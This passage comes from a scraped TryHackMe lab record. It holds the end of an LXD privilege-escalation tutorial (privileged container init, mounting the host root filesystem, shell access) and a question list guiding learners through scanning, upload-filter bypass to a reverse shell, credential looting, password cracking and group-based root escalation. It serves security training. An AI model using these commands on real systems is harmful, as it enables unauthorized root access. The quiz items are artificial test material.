src="https://i.imgur.com/CpTIK5V.png" style="text-align:center;width:100%" /><br /></p><p></p><p style="text-align:center"><i>Checking what images are available via the command: lxc image list</i></p><p>4. Now for the fun bit. Next, we\'ll run a series of commands which initialize, configure the disks, and start the container. Image name needs to match up with the imported image we\'ll be using. In the case of the image above, that\'d be the myimage alias previously assigned to it. The container name and device name are whatever your heart desires. In my example, I\'m naming my container strongbad and the device trogdor.</p><p><br /></p><p><code>lxc init IMAGENAME CONTAINERNAME -c security.privileged=true</code></p><p><i>Ex: lxc init myimage strongbad -c security.privileged=true</i></p><p><i><br /></i></p><p><code>lxc config device add CONTAINERNAME DEVICENAME disk source=/ path=/mnt/root recursive=true</code></p><p><i>Ex: lxc config device add strongbad trogdor disk source=/ path=/mnt/root recursive=true</i></p><p><i><br /></i></p><p><code>lxc start CONTAINERNAME</code></p><p><i>Ex: lxc start strongbad</i></p><p><i><br /></i></p><p><code>lxc exec CONTAINERNAME /bin/sh</code></p><p><i>Ex: lxc exec strongbad /bin/sh</i></p><p><br /></p><p>We\'ll then run just a few more commands to mount our storage and verify we\'ve escalated to root:</p><p><code>id</code></p><p><code>cd /mnt/root/root</code></p><p><br /></p><p>And that\'s it! If that was a bit of a mind-bender, I highly recommend checking out the resource provided below.\xa0</p><p><br /></p><p>Additional information on this privesc technique can be found here: <a href="https://www.hackingarticles.in/lxd-privilege-escalation/" target="_blank">Link</a></p><hr style="border:1px solid var(--main-color)" /><p style="margin-bottom:0px" align="center"><span style="font-size:18px"><i><br />Remember that machines can take up to five minutes to boot up fully!</i></span></p><p><br /></p>', 'taskType': 'vm', 'taskNo': 26, 'taskCreated': '2020-11-12T02:50:16.959Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fded5e5863d527066512c61', 'questions': [{'questionNo': 1, 'question': '<p>Scan the machine. What ports are open?<br /></p>\n', 'hint': "You'll need to perform a full scan here of all ports."}, {'questionNo': 2, 'question': '<p>What\'s the title of the hidden website?<span style="font-size:1rem">\xa0It\'s worthwhile looking recursively at all websites on the box for this step.\xa0</span><br /></p>', 'hint': 'There are several websites on this box, find the right one.'}, {'questionNo': 3, 'question': '<p>What is the name of the hidden php page?<br /></p>', 'hint': "Gobuster is suggested here. You'll need to use common web file extensions as well in this bit to find your target."}, {'questionNo': 4, 'question': '<p>What is the name of the hidden directory where file uploads are saved?<br /></p>', 'hint': 'Gobuster is suggested here. '}, {'questionNo': 5, 'question': '<p>Bypass the filters. Upload and execute a reverse shell.\xa0<br /></p>', 'hint': 'There are two filters present here: one client-side and one server-side. Refer back to day two for the server-side bypass.'}, {'questionNo': 6, 'question': '<p>What is the value of the web.txt flag?<br /></p>', 'hint': 'This can be found in /var/www/'}, {'questionNo': 7, 'question': '<p>Upgrade and stabilize your shell.\xa0<br /></p>', 'hint': 'Refer to the notes above in the task dossier. Be sure to use Python3 here.'}, {'questionNo': 8, 'question': '<p>Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? <b>username:password</b><br /></p>', 'hint': 'Be sure to review the included files under /var/www/TheGrid/'}, {'questionNo': 9, 'question': '<p>Access the database and discover the encrypted credentials. What is the name of the database you find these in?<br /></p>', 'hint': 'You can view how to connect to this in the above task dossier '}, {'questionNo': 10, 'question': '<p>Crack the password. What is it?<br /></p>', 'hint': 'You can view how to crack the password in the above task dossier '}, {'questionNo': 11, 'question': '<p>Use su to login to the newly discovered user by exploiting password reuse.\xa0<br /></p>', 'hint': ''}, {'questionNo': 12, 'question': '<p>What is the value of the user.txt flag?<br /></p>', 'hint': 'You can find this in /home/flynn/'}, {'questionNo': 13, 'question': "<p>Check the user's groups. Which group can be leveraged to escalate privileges?\xa0<br /></p>", 'hint': 'You can do this with the command: id'}, {'questionNo': 14, 'question': '<p>Abuse this group to escalate privileges to root.<br /></p>', 'hint': ''}, {'questionNo': 15, 'question': '<p>What is the value of the root.txt flag?<br /></p>', 'hint': 'You can find this in /root/'}]}, {'taskTitle': 'Next Steps', 'taskDesc': '<div style="text-align:center"><span style="font-size:18px"><br />Now you\'ve managed to deploy and access a TryHackMe machine, search for a security topic to learn about on the\xa0<a href="https://tryhackme.com/hacktivities" target="_blank">Hacktivities</a>\xa0page.</span></div><div style="text-align:center"><span style="font-size:18px"><br /></span></div><div style="text-align:center">Don\'t forget to check out our\xa0<a href="https://tryhackme.com/paths" target="_blank">Pathways</a>\xa0for a more guided learning experience.</div><div style="text-align:center"><br /></div><div style="text-align:center"><span style="font-weight:bolder">Other interesting offerings:<br /><br /></span></div><div style="text-align:center"><span class="fas fa-minus hacker-green"></span>\xa0We release weekly security challenges\xa0and walkthroughs</div><div style="text-align:center"><span class="fas fa-minus hacker-green"></span>\xa0You can upload your own VMs and\xa0<a href="https://tryhackme.com/develop-rooms" target="_blank">make your own rooms</a></div><div style="text-align:center"><span class="fas fa-minus hacker-green"></span>\xa0Come join our\xa0<a href="https://discord.gg/tryhackme" target="_blank">Discord</a>\xa0community and say hi!</div>', 'taskType': 'none', 'taskNo': 27, 'taskCreated': '2020-11-12T02:50:24.369Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Read the above and explore TryHackMe!<br /></p>\n', 'hint': ''}]}]}